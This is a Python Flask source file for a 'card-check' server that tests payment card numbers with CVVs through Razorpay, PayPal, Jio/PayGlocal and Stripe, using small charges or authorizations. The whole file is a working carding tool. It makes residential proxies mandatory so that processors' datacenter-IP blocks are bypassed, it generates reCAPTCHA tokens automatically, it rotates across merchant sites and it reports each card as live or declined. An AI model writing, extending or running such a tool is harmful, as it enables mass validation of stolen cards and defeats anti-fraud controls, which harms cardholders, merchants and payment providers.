"""RZ API Server — Razorpay ₹1 card-check walker.

Flask server on port 5003.

  GET /razorpay-135-1?cc=<card>&proxy=<proxy>&site=<payment-page-url>
  → picks a Razorpay payment page (from the pool, or the `site` in the request)
  → mints the reCAPTCHA token the order API now demands (see README)
  → creates order → submits card → returns verbatim gateway response

  Requests WITHOUT proxy are rejected — the proxy is MANDATORY
  (razorpay blocks datacenter IPs at the payment step — only resi egress works).
"""
import sys, os, re, json, time, asyncio, threading, subprocess, concurrent.futures
from urllib.parse import urlsplit
from flask import Flask, request, jsonify

_BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _BASE)

import threading as _th
_loop = asyncio.new_event_loop()
_loop_thread = _th.Thread(target=_loop.run_forever, daemon=True)
_loop_thread.start()

from gates.hsin_rz.checker import check_razorpay

app = Flask(__name__)

def _exc(e):
    name = type(e).__name__
    msg = str(e) or repr(e)
    return f"{name}: {msg}" if msg else name

_th_lock = _th.Lock()

def process_rz(cc, mm, yy, cvv, proxy_str=None, site=None):
    # one browser walker at a time — two concurrent chromiums OOM the 512MB container
    with _th_lock:
        fut = asyncio.run_coroutine_threadsafe(
            check_razorpay(cc, mm, yy, cvv, proxy=proxy_str, site=site),
            _loop
        )
        result = fut.result(timeout=280)
        return result

@app.route("/razorpay-135-1")
def razorpay_check():
    cc = request.args.get("cc", "")
    proxy = request.args.get("proxy", "")
    site = request.args.get("site", "").strip() or None
    if not cc or "|" not in cc:
        return jsonify({"error": "missing or invalid cc"})

    # ── proxy is MANDATORY — no proxy → return error (razorpay blocks DC IPs) ──
    if not proxy or proxy == "no" or proxy == "":
        return jsonify({
            "error": "proxy parameter is MANDATORY — razorpay blocks datacenter IPs at the checkout step. "
                     "Use a resi proxy: GET /razorpay-135-1?cc=...&proxy=http://user:pass@host:port"
        }), 400

    parts = cc.split("|")
    _cc, _mm, _yy, _cvv = parts[0], parts[1], parts[2][-2:] if len(parts[2]) == 4 else parts[2], parts[3]

    t0 = time.time()
    try:
        res = process_rz(_cc, _mm, _yy, _cvv, proxy, site)
        status = str(res.get("status", "ERROR")).upper()
        response = str(res.get("response") or res.get("message") or "Unknown")

        return jsonify({
            "cc": cc,
            "Gateway": "Razorpay ₹1",
            "Status": status,
            "Response": response,
            "Price": "1",
            "Currency": "INR",
            "IP": proxy.split("@")[-1].split(":")[0] if "@" in proxy else proxy,
            "timetaken": f"{time.time()-t0:.1f}s",
        })
    except Exception as e:
        return jsonify({
            "cc": cc, "Gateway": "Razorpay ₹1",
            "Response": f"Error: {_exc(e)}",
            "Status": False, "IP": proxy or "no", "timetaken": f"{time.time()-t0:.1f}s",
        })

@app.route("/debug-captcha")
def debug_captcha():
    site = request.args.get("site", "").strip()
    proxy = request.args.get("proxy", "").strip()
    if not site:
        return jsonify({"error": "missing site"})
    args = {"site": site, "proxy_server": None, "proxy_user": None, "proxy_pass": None}
    if proxy:
        u = urlsplit(proxy if proxy.startswith("http") else "http://" + proxy)
        args["proxy_server"] = f"{u.scheme or 'http'}://{u.hostname}:{u.port or 8080}"
        if u.username:
            args["proxy_user"] = u.username
            args["proxy_pass"] = u.password or ""
    cap_py = os.path.join(_BASE, "gates", "hsin_rz", "captcha.py")
    try:
        proc = subprocess.run([sys.executable, cap_py, json.dumps(args)],
                              capture_output=True, text=True, timeout=120)
        return jsonify({"py": sys.executable, "rc": proc.returncode,
                        "stdout": proc.stdout[:2000], "stderr": proc.stderr[-3000:]})
    except Exception as e:
        return jsonify({"py": sys.executable, "error": _exc(e)})



# ── PayPal lanes (ported from pp_api_server.py) ─────────────────────────────
_PP_FIELDS = ("client_id", "client_secret", "amount",
              "firstName", "lastName", "email",
              "address1", "city", "state", "zip", "country")

def _pp_out(cc, res, amount, t0, include_debug, proxy_raw=""):
    status = str(res.get("status", "ERROR")).upper()
    amount_s = str(amount or "1.00")
    try:
        amount_s = str(float(amount_s)).rstrip("0").rstrip(".") or "0"
    except Exception:
        pass
    px = (proxy_raw or "").strip()
    ip = px.split("@")[-1].split(":")[0] if "@" in px else (px or "direct")
    out = {
        "cc": cc, "Gateway": "PayPal Key [1$]",
        "Status": status,
        "Response": str(res.get("response", ""))[:70],
        "Price": amount_s,
        "Currency": "USD",
        "IP": ip,
        "timetaken": f"{time.time()-t0:.1f}s",
    }
    if include_debug:
        out["Decline"] = res.get("decline_code") or ""
        out["Raw"] = json.dumps(res, default=str)[:1500]
    return out

def _pp_kwargs():
    kwargs = {}
    for param in _PP_FIELDS:
        val = request.args.get(param)
        if val:
            kwargs[param] = val
    kwargs.setdefault("amount", "1.00")
    return kwargs

def _pp_run(runner, cc):
    t0 = time.time()
    parts = cc.split("|")
    kwargs = _pp_kwargs()
    proxy_raw = request.args.get("proxy", "")
    kwargs["proxy_str"] = normalize_proxy(proxy_raw)
    res = runner(parts[0], parts[1].zfill(2), parts[2][-2:], parts[3], **kwargs)
    dbg = request.args.get("debug", "").lower() in ("yes", "1", "true")
    return _pp_out(cc, res, kwargs.get("amount"), t0, dbg, proxy_raw)

def _normalize_proxy_render(raw):
    raw = (raw or "").strip()
    if not raw or raw.lower() in ("no", "live", "none"):
        return ""
    if raw.startswith("http"):
        u = urlsplit(raw)
        host, port = u.hostname, u.port or (443 if u.scheme == "https" else 8080)
        if u.username:
            return f"{host}:{port}:{u.username}:{u.password or ''}"
        return f"{host}:{port}"
    return raw

normalize_proxy = _normalize_proxy_render

@app.route("/pp")
@app.route("/paypal-1")
def pp_check():
    from gates.paypal_direct import run_check
    cc = request.args.get("cc", "").strip()
    if not cc or "|" not in cc:
        return jsonify({"error": "missing or invalid cc — format CC|MM|YY|CVV"}), 400
    return jsonify(_pp_run(run_check, cc))

@app.route("/ppdirect")
def pp_direct():
    from gates.paypal_direct import run_check
    cc = request.args.get("cc", "").strip()
    if not cc or "|" not in cc:
        return jsonify({"error": "cc=CC|MM|YY|CVV"}), 400
    return jsonify(_pp_run(run_check, cc))

@app.route("/ppcvv")
def pp_cvv():
    from gates.paypal_cvv import run_paypal_check
    cc = request.args.get("cc", "").strip()
    if not cc or "|" not in cc:
        return jsonify({"error": "cc=CC|MM|YY|CVV"}), 400
    return jsonify(_pp_run(run_paypal_check, cc))




# ─── Jio / PayGlocal lane (gates.jio = standalone jio2 engine) ───
_jio_exec = concurrent.futures.ThreadPoolExecutor(max_workers=1)
_jio_lock = threading.Lock()

@app.route("/jio")
def jio_check():
    from gates.jio import (_run_jio, _parse_card, _detect_brand, _mask,
                           SUPPORTED_BRANDS, MAX_RETRIES,
                           RETRY_DELAY_MIN, RETRY_DELAY_MAX)
    import random as _rnd
    number = (request.args.get("jio") or request.args.get("number") or "").strip()
    amount = (request.args.get("amount") or "").strip()
    cc_raw = (request.args.get("cc") or "").strip()
    proxy_raw = (request.args.get("proxy") or "").strip()
    debug = (request.args.get("debug") or "").strip().lower() in ("1", "true", "yes")
    t0 = time.time()

    if not number or not re.fullmatch(r"\d{10}", number) or not amount:
        return jsonify({"error": "missing or invalid params — use /jio?jio=<10-digit>&amount=<amt>&cc=<card>&proxy=<proxy>"}), 400
    try:
        amount_f = float(amount)
    except ValueError:
        return jsonify({"error": "missing or invalid params — amount must be numeric"}), 400
    if amount_f <= 0:
        return jsonify({"error": "missing or invalid params — amount must be > 0"}), 400
    card = _parse_card(cc_raw)
    if not card:
        return jsonify({"error": "missing or invalid cc"}), 400
    brand = _detect_brand(card["cc"])
    if brand["brand"] not in SUPPORTED_BRANDS:
        return jsonify({"error": f"card brand not supported ({brand['brand']}) — visa/mastercard/amex only"}), 400

    result, _reason = None, ""
    _jio_lock.acquire()
    try:
        return _jio_run_attempts(number, amount_f, card, proxy_raw, debug, t0, cc_raw)
    finally:
        _jio_lock.release()

def _jio_run_attempts(number, amount_f, card, proxy_raw, debug, t0, cc_raw):
    from gates.jio import (_run_jio, _parse_card, _detect_brand, _mask,
                           SUPPORTED_BRANDS, MAX_RETRIES,
                           RETRY_DELAY_MIN, RETRY_DELAY_MAX)
    import random as _rnd
    result, _reason = None, ""
    for attempt in range(1, MAX_RETRIES + 2):
        if attempt > 1:
            time.sleep(_rnd.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
        fut = _jio_exec.submit(_run_jio, number, card, amount_f, proxy_raw or None, debug)
        try:
            result, _reason = fut.result(timeout=110)
        except concurrent.futures.TimeoutError:
            fut.cancel()
            result = {"status": "error", "response": "Timeout (plan lookup stuck)",
                      "amount": amount_f, "gate": "unknown"}
            break
        except Exception as e:
            result = {"status": "error", "response": f"Internal error: {type(e).__name__}",
                      "amount": amount_f, "gate": "unknown"}
            break
        if result["status"] != "error":
            break

    gate = str(result.get("gate") or "").strip().title()
    gateway = f"Jio {gate}" if gate and gate.lower() != "unknown" else "Jio"
    st = str(result.get("status", "ERROR")).upper()
    amt = result.get("amount")
    try:
        amt_s = str(float(amt)).rstrip("0").rstrip(".") or "0"
    except Exception:
        amt_s = str(amt or amount)
    out = {
        "cc": cc_raw, "Gateway": gateway,
        "Status": st,
        "Response": str(result.get("response", "")),
        "Price": amt_s,
        "Currency": "INR",
        "IP": proxy_raw.split("@")[-1].split(":")[0] if "@" in proxy_raw else (proxy_raw or "direct"),
        "timetaken": f"{time.time()-t0:.1f}s",
    }
    if debug:
        out["Raw"] = json.dumps(result, default=str)[:1500]
    return jsonify(out)




# ─── Stripe Auth lane (token check via gates.hsin_stripe_auth) ───
def process_stripe_auth(cc, mm, yy, cvv, proxy_str=None):
    from gates.hsin_stripe_auth.checker import check_stripe_auth
    fut = asyncio.run_coroutine_threadsafe(
        check_stripe_auth(cc, mm, yy, cvv, proxy=proxy_str or None),
        _loop
    )
    return fut.result(timeout=90)

@app.route("/stripeauth")
def stripe_auth_check():
    cc = request.args.get("cc", "")
    proxy = request.args.get("proxy", "").strip()
    if not cc or "|" not in cc:
        return jsonify({"error": "missing or invalid cc — use /stripeauth?cc=<card|mm|yy|cvv>&proxy=<optional>"}), 400
    parts = cc.split("|")
    _cc, _mm, _yy, _cvv = parts[0], parts[1].zfill(2), parts[2][-2:] if len(parts[2]) == 4 else parts[2], parts[3]
    t0 = time.time()
    try:
        res = process_stripe_auth(_cc, _mm, _yy, _cvv, proxy)
    except concurrent.futures.TimeoutError:
        return jsonify({"error": "stripe auth timed out"}), 504
    except Exception as e:
        return jsonify({"error": f"internal error: {type(e).__name__}"}), 500
    status = str(res.get("status", "ERROR")).upper()
    response = str(res.get("response") or res.get("message") or "Unknown")
    return jsonify({
        "cc": cc,
        "Gateway": "Stripe Auth",
        "Status": status,
        "Response": response,
        "Price": "0",
        "Currency": "USD",
        "IP": proxy.split("@")[-1].split(":")[0] if "@" in proxy else (proxy or "direct"),
        "timetaken": f"{time.time()-t0:.1f}s",
    })




# ─── Stripe Auth site-rotation lane (root stripeauth engine, proxied) ───
_sa_exec = concurrent.futures.ThreadPoolExecutor(max_workers=4)

@app.route("/sa")
def sa_check():
    cc = request.args.get("cc", "")
    if not cc or "|" not in cc:
        return jsonify({"error": "missing or invalid cc — use /sa?cc=<card|mm|yy|cvv>"}), 400
    proxy = request.args.get("proxy", "").strip()
    t0 = time.time()
    fut = _sa_exec.submit(_sa_run, cc)
    try:
        res = fut.result(timeout=240)
    except concurrent.futures.TimeoutError:
        fut.cancel()
        return jsonify({"error": "stripe auth timed out"}), 504
    except Exception as e:
        return jsonify({"error": f"internal error: {type(e).__name__}"}), 500
    status = str(res.get("status", "ERROR")).upper()
    response = str(res.get("response") or "Unknown")
    return jsonify({
        "cc": cc,
        "Gateway": "Stripe Auth",
        "Status": status,
        "Response": response,
        "Price": "0",
        "Currency": "USD",
        "IP": proxy.split("@")[-1].split(":")[0] if "@" in proxy else (proxy or "direct"),
        "timetaken": f"{time.time()-t0:.1f}s",
    })

def _sa_run(cc):
    from gates.stripeauth_sites import process_stripe_auth as _psa
    import asyncio as _aio
    return _aio.run(_psa(cc))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5003)), debug=False)
